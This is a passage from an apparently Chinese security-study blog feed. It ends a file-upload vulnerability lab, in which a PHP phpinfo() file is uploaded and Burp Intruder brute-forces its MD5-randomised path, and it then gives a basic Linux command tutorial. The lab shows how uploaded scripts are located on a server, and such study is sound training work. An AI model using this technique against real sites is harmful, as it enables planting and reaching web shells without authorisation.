将原始文件名和生成的随机数连接起来，然后对连接后的字符串进行 MD5 散列。这是为了生成一个相对短且唯一的字符串，用作文件名的一部分。</p></li><li><p><code>&quot;.&quot;.substr($filename,strripos($filename,&#39;.&#39;)+1)</code>: 获取原始文件名中最后一个点（.）后的文件扩展名。<code>strripos</code> 函数用于获取字符串中指定子字符串最后一次出现的位置，然后 <code>substr</code> 用于获取该位置之后的子字符串。这样构建的字符串包含了文件的扩展名（比如 <code>.jpg</code> 或 <code>.txt</code>）。</p></li><li><p><code>&#39;/&#39;.md5($filename.$randnum).&quot;.&quot;.substr($filename,strripos($filename,&#39;.&#39;)+1)</code>: 将上述两部分字符串连接在一起，再在前面加上斜杠 <code>/</code>，形成完整的文件路径。</p></li></ul><p>点击一下（上传文件的路径）</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201955712.png" alt="QQ截图20240110164528"></p><p>我们上传一个625.php的文件，使用burp抓包一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;                    //看php版本信息</span><br></pre></td></tr></table></figure><p>所以我们访问的文件路径是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.114/upload/625.php</span><br></pre></td></tr></table></figure><p>burp抓包一下</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201955747.png" alt="QQ截图20240110164739"></p><p>发送到Intruder，在625的位置添加payload位置$</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110164910.png" alt="QQ截图20240110164910"></p><p>设置payload，它的范围是1-9999</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110165102.png" alt="QQ截图20240110165102"></p><p>根据上面的代码提示，我们需要添加一个前缀625.php和MD5加密</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110165234.png" alt="QQ截图20240110165234"></p><p>开始攻击</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110165525.png" alt="QQ截图20240110165525"></p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110165626.png" alt="QQ截图20240110165626"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2&gt;&lt;span id=&quot;一-文件上传漏洞类型汇总&quot;&gt;一、文件上传漏洞类型汇总&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>三十七，Linux基础命令</title>
    <link href="http://example.com/2024/01/08/%E4%B8%89%E5%8D%81%E4%B8%83%EF%BC%8CLinux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
    <id>http://example.com/2024/01/08/%E4%B8%89%E5%8D%81%E4%B8%83%EF%BC%8CLinux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</id>
    <published>2024-01-08T06:23:03.000Z</published>
    <updated>2024-01-08T06:34:25.163Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="linux发行版本">Linux发行版本</span></h1><p>目前linux有四大常见的主分支，分别为Debian系、Redhat系、Arch系和SUSE系</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401081433608.png" alt="image-20240108142733469"></p><h1><span id="linux-的文件系统">Linux 的文件系统</span></h1><p> Linux系统中一切皆文件 ，Linux 的文件系统采用层次结构，类似于树形结构。在根目录下，有许多子目录和文件。以下是一些重要的子目录：</p><p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231201145729193.png" alt="image-20231201145729193"></p><p>&#x2F;bin<br>是binary的缩写，这个目录存放着最经常使用的命令，通过上方桌面可以看到bin文件夹有个箭头，是链接到 &#x2F;usr&#x2F;bin下，相当于快捷方式，进入&#x2F;bin和&#x2F;usr&#x2F;bin下是一模一样的  </p><p>&#x2F;home<br>存放普通用户的主目录，在Linux中每个用户都有一个自己的目录，一版该目录名是以用户的账号命名的。<br>        &#x2F;root<br>该目录为系统管理员，也称为超级权限者的用户主目录。<br>&#x2F;lib<br>系统开机所需要最基本的动态连接共享库，其作用类似于windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库。<br>&#x2F;etc<br>所有的系统管理所需要的配置文件和子目录。<br>&#x2F;usr<br>这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program fies目录。<br>&#x2F;boot<br>这里存放的是启动linux时使用的一些核心文件，包括一些连接文件以及镜像文件，自己的安装别放这里。<br>&#x2F;proc<br>这个目录是一个虚拟目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。<br>&#x2F;srv<br>service缩写，该目录存放一些服务启动之后需要提取的数据。<br>&#x2F;sys<br>这是linux2.6内核的一个很大的变化。该目录下安装了2.6内核中新出现的一个文件系统sysfs。<br>&#x2F;tmp<br>这个目录是用来存放一些临时文件的。<br>&#x2F;dev<br>类似于windows的设备管理器，把所有的硬件用文件的形式存储。管理着所有设备，例如CPU、硬盘等等<br>&#x2F;media<br>linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下。<br>centos7迁移到&#x2F;run&#x2F;media<br>&#x2F;mnt<br>系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将外部的存储挂载在&#x2F;mnt上，然后进入该目录就可以查看里面的内容了。和media差不多<br>&#x2F;opt<br>这是给主机额外安装软件所摆放的目录。比如你安装一个mysql数据库则就可以放在这个目录下。默认是空的。<br>&#x2F;var<br>这个目录中存放着在不断扩充的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。<br>&#x2F;lost+found<br>这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。<br>&#x2F;www<br>&#x2F;www目录可以用于存储Web应用程序或网站文件，&#x2F;www目录没有特别的用途，它只是一个常规目录，可以根据需要进行使用和管理。</p><h1><span id="vi-x2f-vim编辑器">vi &#x2F; vim编辑器</span></h1><p>用户名@主机名 组成， ~号代表当前目录位置为用户家目录，#号代表管理员用户，普通用户都是$号</p><p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231201145857392.png" alt="image-20231201145857392"><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231201145932791.png" alt="image-20231201145932791"></p><p> VI 是 Unix 操作系统和类 Unix 操作系统中最通用的文本编辑器。VIM 编辑器是从 VI 发展出来的一个性能更强大的文本编辑器。可以主动的以字体颜色辨别语法的正确性，方便程序设计。VIM 与 VI 编辑器完全兼容。 </p><p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231201150000413.png" alt="image-20231201150000413"></p><p>模式转换 </p><p>进来默认一般模式，想要编辑文本就按i进入编辑模式  </p><p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231201150015146.png" alt="image-20231201150015146"></p><p>vim常用语法<br>一般模式</p><p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231201150120375.png" alt="image-20231201150120375"></p><p>编辑模式</p><p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231201150126924.png" alt="image-20231201150126924"></p><p><strong>按『Esc』键</strong> 退出编辑模式，之后所在的模式为一般模式。<br>命令模式</p><h1><span id><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231201150137530.png" alt="image-20231201150137530"></span></h1><h1><span id="关机重启命令">关机重启命令</span></h1><p>将数据由内存同步到硬盘中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sync</span><br></pre></td></tr></table></figure><p>重启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br><span class="line"></span><br><span class="line"># 两者作用一样</span><br><span class="line"></span><br><span class="line">shutdown -r now</span><br></pre></td></tr></table></figure><p>关机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 立马关机</span><br><span class="line"></span><br><span class="line">shutdown -h now</span><br><span class="line"></span><br><span class="line"># 计算机将在1分钟后关机，并且会显示在登录用户的当前屏幕中</span><br><span class="line"></span><br><span class="line">shutdown -h 1 ‘This server will shut down after 1 mins‘</span><br><span class="line"></span><br><span class="line"># 指定时间关机</span><br><span class="line"></span><br><span class="line">shutdown 15:28</span><br><span class="line"></span><br><span class="line"># 取消关机操作</span><br><span class="line"></span><br><span class="line">shutdown -c</span><br></pre></td></tr></table></figure><h1><span id="常用命令">常用命令</span></h1><h2><span id="文件目录类">文件目录类</span></h2><ol><li>pwd 显示当前工作目录的绝对路径</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><ol start="2"><li><p>ls 列出目录的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ls：列出当前目录中的文件和子目录。</span><br><span class="line">ls -l：以长格式列出当前目录中的文件和子目录，包括文件权限、所有者、文件大小、修改日期等详细信息。</span><br><span class="line">ls -a：列出当前目录中的所有文件和子目录，包括隐藏文件和目录。</span><br><span class="line">ls -h：以人类可读的格式列出文件大小，例如，使用KB、MB、GB等单位。</span><br><span class="line">ls -t：按修改时间排序列出文件和子目录，最新修改的文件和目录将显示在最上面。</span><br><span class="line">ls -r：反向排序列出文件和子目录，即从最后一个文件或目录开始列出。</span><br><span class="line">ls -R：递归列出当前目录及其子目录中的所有文件和子目录。</span><br><span class="line">ls -i：显示每个文件和目录的inode号码。</span><br></pre></td></tr></table></figure></li></ol><p>ls [选项] [目录或是文件]<br>可以多个参数组合如：ls -al<br>每行列出的信息依次是： 文件类型与权限，链接数，文件属主，文件属组，文件大小用byte来表示，建立或最近修改的时间，名字</p><ol start="3"><li>cd 切换目录</li></ol><p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231201150931677.png" alt="image-20231201150931677"></p><ol start="4"><li><p>mkdir 创建一个新的目录 、 rmdir 删除一个空的目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir [选项] 要创建的目录</span><br><span class="line">mkdir xiyou</span><br><span class="line"></span><br><span class="line"># -p 创建多层目录</span><br><span class="line">mkdir -p xiyou/dssz/meihouwang  </span><br></pre></td></tr></table></figure></li></ol><p> rmdir 要删除的空目录  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmdir xiyou/dssz/meihouwang</span><br></pre></td></tr></table></figure><ol start="5"><li>touch 创建空文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">touch 文件名称</span><br><span class="line">touch xiyou/dssz/sunwukong.txt</span><br><span class="line"></span><br><span class="line">#在当前文件夹下创建隐藏文件 1.txt</span><br><span class="line">touoch 文件名称  .1.xtx</span><br></pre></td></tr></table></figure><ol start="6"><li><p>cp 复制文件或目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#cp 源文件 目标文件</span><br><span class="line">#将xiyou/dssz目录下的suwukong.txt复制到xiyou/mingjie/目录下</span><br><span class="line">cp xiyou/dssz/suwukong.txt xiyou/mingjie/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#-r 递归复制整个文件夹 </span><br><span class="line">#将 xiyou/dssz/所有内容复制到当前文件夹</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>rm 删除文件或目录</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231201152459418.png" alt="image-20231201152459418"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rm [选项] deleteFile （功能描述：递归删除目录中所有内容）</span><br><span class="line"></span><br><span class="line">rm sunwukong.txt # 删除文件</span><br><span class="line"></span><br><span class="line">rm -rf dssz/  # 递归删除目录中所有内容</span><br></pre></td></tr></table></figure><ol start="8"><li>mv 移动文件与目录或重命名<br>mv 源文件 目标文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">（1）mv oldNameFile newNameFile （功能描述：重命名）</span><br><span class="line">（2）mv /temp/movefile /targetFolder （功能描述：移动文件）</span><br><span class="line"></span><br><span class="line"># 重命名</span><br><span class="line"></span><br><span class="line">mv xiyou/dssz/suwukong.txt xiyou/dssz/houge.txt</span><br><span class="line"></span><br><span class="line"># 移动文件</span><br><span class="line"></span><br><span class="line">mv xiyou/dssz/houge.txt ./</span><br></pre></td></tr></table></figure><ol start="9"><li>cat 查看文件内容</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat -n houge.txt  # -n参数显示行号</span><br></pre></td></tr></table></figure><p>文件内容分屏查看器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">more 要查看的文件</span><br><span class="line">more nginx.conf</span><br><span class="line">或者</span><br><span class="line">less nginx.conf</span><br><span class="line"></span><br><span class="line">二者功能类似，less更好用 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231201152441663.png" alt="image-20231201152441663"></p><ol start="10"><li>echo输出内容到控制台</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo [选项] [输出内容]</span><br><span class="line">可以用在写脚本的时候输出日志</span><br><span class="line">-e： 支持反斜线控制的字符转换</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231201152546073.png" alt="image-20231201152546073"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo “hello\tworld”</span><br><span class="line"></span><br><span class="line">echo -e “hello\tworld” # -e支持反斜线控制的字符转换</span><br></pre></td></tr></table></figure><ol start="11"><li><blockquote><p>覆盖写入 和 &gt;&gt; 追加写入</p></blockquote></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">（1）将 cat 查看信息写入到文件中</span><br><span class="line">cat ./1.txt&gt;houge.txt</span><br><span class="line"></span><br><span class="line"> （2）将 ls 查看信息追加到文件中  </span><br><span class="line">ls -l&gt;&gt;houge.txt</span><br><span class="line"></span><br><span class="line"> （3）采用 echo 将 hello 单词追加到文件中  </span><br><span class="line">echo hello&gt;&gt;houge.txt</span><br></pre></td></tr></table></figure><ol start="12"><li>history 查看已经执行过历史命令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）查看已经执行过的历史命令</span><br><span class="line">history</span><br><span class="line"></span><br><span class="line"> （2）清空历史记录  </span><br><span class="line">history -c</span><br></pre></td></tr></table></figure><ol start="13"><li>find：搜索文件&#x2F;目录</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -name ss表示搜索在根目录下名字为 的文件</span><br><span class="line">find / -size   +2134  表示搜索在根目录下大小大于2134的文件</span><br><span class="line">find / -user  root    表示搜索用户名字为root的用户</span><br><span class="line">-iname表示不区分大小写</span><br><span class="line">ls*  开头为ls后面随意   *ls* 中间为ls*ls 末尾为ls</span><br></pre></td></tr></table></figure><ol start="14"><li>grep 表示查找</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 单个文件中查找</span><br><span class="line">grep &quot;string&quot; filename</span><br><span class="line"></span><br><span class="line"># 多个文件中查找字符</span><br><span class="line">grep &quot;string&quot; file1 file2 file3</span><br><span class="line"></span><br><span class="line"># 忽略大小写查找指定字符串</span><br><span class="line">grep -i &quot;string&quot; filename</span><br><span class="line"></span><br><span class="line">#将匹配的行输出到文件中  </span><br><span class="line">grep &quot;string&quot; filename &gt; output.txt</span><br><span class="line"></span><br><span class="line">ls/bin |grep mv </span><br><span class="line">表示查找bin目录下有mv字母的文件</span><br></pre></td></tr></table></figure><h1><span id="用户命令">用户命令</span></h1><ol><li>用户管理命令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">useradd 添加新用户</span><br><span class="line">useradd 用户名 （功能描述：添加新用户）</span><br><span class="line">useradd -g 组名 用户名 （功能描述：添加新用户到某个组）</span><br><span class="line"></span><br><span class="line">#添加一个hum用户</span><br><span class="line">useradd hmb</span><br></pre></td></tr></table></figure><ol start="2"><li>passwd 设置用户密码</li></ol><p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231201153459872.png" alt="image-20231201153459872"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">passwd 用户名 （功能描述：设置用户密码）</span><br><span class="line"></span><br><span class="line">（1）设置用户的密码</span><br><span class="line">passwd hmb</span><br></pre></td></tr></table></figure><ol start="3"><li>id  查看用户是否存在</li></ol><p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231201153546197.png" alt="image-20231201153546197"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">id 用户名</span><br><span class="line">查看用户是否存在</span><br><span class="line">id hmb</span><br><span class="line"></span><br><span class="line">whoami查看当前用户</span><br><span class="line"></span><br><span class="line">#查看一共有几个用户</span><br><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><ol start="4"><li>su 切换用户</li></ol><p>su 用户名称 （功能描述：切换用户，只能获得用户的执行权限，不能获得环境变量）<br>su - 用户名称 （功能描述：切换到用户并获得该用户的环境变量及执行权限）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）切换用户</span><br><span class="line">su hmb</span><br><span class="line"></span><br><span class="line">su - hmb</span><br></pre></td></tr></table></figure><ol start="5"><li>userdel 删除用户<br>（1）userdel 用户名 （功能描述：删除用户但保存用户主目录）<br>（2）userdel -r 用户名 （功能描述：用户和用户主目录，都删除）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">userdel hmb</span><br><span class="line"></span><br><span class="line">userdel -r hmb</span><br></pre></td></tr></table></figure><ol start="6"><li>sudo 设置普通用户具有 root 权限<br>sudo 需要执行的命令</li></ol><p>（1）usermod 修改用户<br>usermod -g 用户组 用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-a:仅和-G一块使用，将用户添加到附属组群。</span><br><span class="line">-d:修改用户登入时的目录，例如一般的用户登录时，默认进入预先设定的主目录，某些时候为了方便登录时就需要进入比较复杂的路径时，可以使用这个选项设置进入时目录。</span><br><span class="line">-g:修改用户所属群组。</span><br><span class="line">-G:修改用户所属的附加群组；在改变用户sudo权限时就可以使用这个选项。</span><br><span class="line">-s:修改用户登录后所使用的shell版本</span><br><span class="line"> （1）将用户加入到用户组  </span><br><span class="line">usermod -g root zhubajie</span><br></pre></td></tr></table></figure><p>（2）用户组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">groupadd 新增组</span><br><span class="line">groupadd 组名</span><br><span class="line">添加一个xitianqujing组</span><br><span class="line">groupadd xitianqujing</span><br><span class="line"></span><br><span class="line">groupdel 删除组</span><br><span class="line">groupdel 组名</span><br><span class="line">删除xitianqujing组</span><br><span class="line">groupdel xitianqujing</span><br><span class="line"></span><br><span class="line">groupmod 修改组</span><br><span class="line">groupmod -n 新组名 老组名</span><br><span class="line"></span><br><span class="line">groupmod -n xitian xitianqujing</span><br><span class="line"></span><br><span class="line">cat /etc/group 查看创建了哪些组</span><br><span class="line">cat /etc/group</span><br></pre></td></tr></table></figure><ol start="6"><li>文件权限类<br>文件属性</li></ol><p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231201154419053.png" alt="image-20231201154419053"></p><p>使用ll或 ls -lh命令查看权限<br>如果没有权限，就会出现减号[ - ]而已。从左至右用0-9这些数字来表示:<br>    首位表示类型<br>        在Linux中第一个字符代表这个文件是目录、文件或链接文件等等<br>        0 代表文件<br>        d 代表目录<br>        l 链接文档(link file)；<br>    第1-3位确定属主（该文件的所有者）拥有该文件的权限。—User<br>    第4-6位确定属组（所有者的同组用户）拥有该文件的权限，—Group<br>    第7-9位确定其他用户拥有该文件的权限 —Other<br>（1）、rwx 作用文件和目录的不同解释<br>    （1）作用到文件：<br>    [ r ]代表可读(read): 可以读取，查看<br>    [ w ]代表可写(write): 可以修改，但是不代表可以删除该文件，删除一个文件的前<br>    [ x ]代表可执行(execute):可以被系统执行<br>    （2）作用到目录：<br>    [ r ]代表可读(read): 可以读取，ls查看目录内容<br>    [ w ]代表可写(write): 可以修改，目录内创建+删除+重命名目录<br>    [ x ]代表可执行(execute):可以进入该目录<br>ll命令查看解释  </p><p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231201154554556.png" alt="image-20231201154554556"></p><p>ls -lh 命令，文件大小会更清晰  </p><p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231201154624316.png" alt="image-20231201154624316"></p><p>（1）如果查看到是文件：链接数指的是硬链接个数。<br>（2）如果查看的是文件夹：链接数指的是子文件夹个数。</p><ol start="7"><li>chmod 改变权限</li></ol><p>第一种方式变更权限<br>chmod [{ugoa}{+ - &#x3D;}{rwx}] 文件或目录</p><p>u:所有者（user）        g:所有组(group)           o:其他人(other)        a:所有人(u、g、o 的总和)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+号代表增加      -号代表取消     = 号代表直接赋予</span><br><span class="line"></span><br><span class="line"> （1）修改文件使其所属主用户具有执行权限  </span><br><span class="line">chmod u+x houge.txt</span><br><span class="line"> （2）修改文件使其所属组用户具有执行权限  </span><br><span class="line">chmod g+x houge.txt</span><br><span class="line"> （3）修改文件所属主用户执行权限,并使其他用户具有执行权限  </span><br><span class="line">chmod u-x,o+x houge.txt</span><br></pre></td></tr></table></figure><p>第二种方式变更权限<br>chmod [mode&#x3D;421 ] [文件或目录]<br>r&#x3D;4         w&#x3D;2        x&#x3D;1       rwx&#x3D;4+2+1&#x3D;7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）采用数字的方式，设置文件所有者、所属组、其他用户都具有可读可写可执行权限。  </span><br><span class="line">chmod 777 houge.txt</span><br><span class="line"> （2）修改整个文件夹里面的所有文件的所有者、所属组、其他用户都具有可读可写可执行权限。  </span><br><span class="line">chmod -R 777 xiyou/</span><br></pre></td></tr></table></figure><p>chown 改变所有者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chown [选项] [最终用户] [文件或目录] （功能描述：改变文件或者目录的所有者）</span><br><span class="line">（1）修改文件所有者</span><br><span class="line">chown hmb houge.txt</span><br><span class="line">（2）递归改变文件所有者和所有组  </span><br><span class="line">chown -R hmb:hmb xiyou/</span><br></pre></td></tr></table></figure><p>chgrp 改变所属组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chgrp [最终用户组] [文件或目录] （功能描述：改变文件或者目录的所属组）</span><br><span class="line">（1）修改文件的所属组</span><br><span class="line">chgrp root houge.txt</span><br></pre></td></tr></table></figure><ol start="7"><li><p>文件下载<br>1）wget<br>● 下载单个文件<br>wget <a href="https://releases.ubuntu.com/20.04.2.0/ubuntu-20.04.2.0-desktop-amd64.iso">https://releases.ubuntu.com/20.04.2.0/ubuntu-20.04.2.0-desktop-amd64.iso</a><br>● 下载文件并指定保存路径：<br>wget -P &#x2F;home&#x2F;user&#x2F;downloads <a href="https://example.com/file.zip">https://example.com/file.zip</a><br>● 限速下载<br>wget –limit-rate&#x3D;200k </p></li><li><p>压缩和解压类<br>(1)、gzip&#x2F;gunzip 压缩（不保留文件）<br>注意：<br>（1）只能压缩文件不能压缩目录<br>（2）不保留原来的文件<br>（3）同时多个文件会产生多个压缩包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">（1）、gzip压缩</span><br><span class="line"></span><br><span class="line">  gzip 文件</span><br><span class="line"></span><br><span class="line">gzip lnTest.txt</span><br><span class="line"></span><br><span class="line"> （2）、gunzip解压缩文件  </span><br><span class="line">gunzip lnTest.txt.gz</span><br></pre></td></tr></table></figure></li></ol><p>2）、zip&#x2F;unzip 压缩（保留文件）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 